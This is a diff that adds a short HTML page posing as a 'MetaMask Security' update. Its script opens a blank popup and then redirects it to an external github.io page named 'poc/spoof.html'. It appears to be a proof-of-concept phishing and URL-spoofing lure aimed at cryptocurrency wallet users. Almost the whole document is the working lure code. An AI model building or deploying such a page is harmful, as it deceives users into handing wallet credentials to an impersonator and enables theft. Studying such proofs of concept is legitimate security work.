@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>MetaMask Security</title></head>
+<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+  <a href="about:blank" target="_blank" onclick="launch(event)" style="font-size:18px;padding:12px 20px;border-radius:8px;border:1px solid #4CAF50;text-decoration:none;">
+    🔒 Launch Secure MetaMask Update
+  </a>
+
+  <script>
+    function launch(e) {
+      e.preventDefault();
+      const win = window.open("about:blank", "_blank");
+      setTimeout(() => {
+        if (win) {
+          win.location.replace("https://sauceialist.github.io/poc/spoof.html");
+        } else {
+          alert("Please allow popups.");
+        }
+      }, 100);
+    }
+  </script>
+</body>
+</html>
